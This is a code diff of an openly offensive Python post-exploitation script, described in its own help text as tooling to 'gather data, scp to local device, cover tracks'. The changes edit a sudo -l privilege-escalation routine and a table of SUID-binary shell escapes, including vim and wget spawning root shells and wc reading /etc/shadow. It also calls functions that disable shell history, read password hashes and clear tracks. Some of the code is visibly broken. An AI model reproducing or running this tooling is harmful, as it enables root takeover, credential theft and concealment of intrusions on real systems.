@@ -11,6 +11,7 @@
 import os
 import argparse
 import re
+import time
 
 
 parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
@@ -49,6 +50,8 @@ def disable_hist():
 
 # check for binaries that can be run as sudo and print privesc script to screen
 def sudo_l():
+    print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
+    time.sleep(5)
     print("\n### finding binaries you can run as sudo... ###")
 
     # commands that will be printed to screen bc they require user interation 
@@ -91,9 +94,9 @@ def sudo_l():
 
 
     # open last line of sudo -l output to determine sudo capabilities
-    with open('/tmp/pwd.txt', 'r') as pwd:
-    last_line = pwd.readlines()[-1]
-    last_line.lower()
+    with open('/tmp/sudo_l.txt', 'r') as pwd:
+        last_line = pwd.readlines()[-1]
+        last_line.lower()
 
     # loop through dictionaries and print cmds if need user interaction, otherwise execute
     for key,value in sudo_bins_print:
@@ -148,13 +151,13 @@ def suid():
     "unzip":"./unzip -K shell.zip&&./sh -p",
     "vim":"./vim -c ':py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')'",
     "wc":"./wc --files0-from /etc/shadow",
-    "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0"
+    "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0",
     "zsh":"./zsh"
     }
 
     # loop through dictionaries and print cmds if need user interaction, otherwise execute
     os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
-    with open("/tmp/pwd.txt") as suid_file:
+    with open("/tmp/sudo_l.txt") as suid_file:
         suid = suid_file.readlines()
         for line in suid:
             if ".sh" in line:
@@ -260,30 +263,9 @@ def clear_tracks():
 
 # try sudo -l with given password
 disable_hist()
-
-try args.password:
-    print("\n### running sudo -l: ###")
-    os.system("timeout -k 3 3 sudo -l -S {} | tee /tmp/pwd.txt".format(password))
-    #os.system("sudo -S < <(echo '{password}') <command>")
-except:
-    print("\n*** error: couldn't run sudo -l, try running it manually ***")
-    return
-else:
-    sudo_l()
-
-
-# try sudo -l if user doesn't requite passwd to run sudo
-if sudo_no_pass:
-    print("\n### running sudo -l: ###")
-    os.system("sudo -l | tee /tmp/pwd.txt")
-
-    sudo_l()
-else:
-    print("\n*** error: couldn't run sudo -l, try running it manually ***")
-    return
-
+sudo_l()
 suid()
 path()
 pass_shadow()
-print("-+- welcome, root -+-")
+print("\n-+- welcome, root -+-")
 clear_tracks()
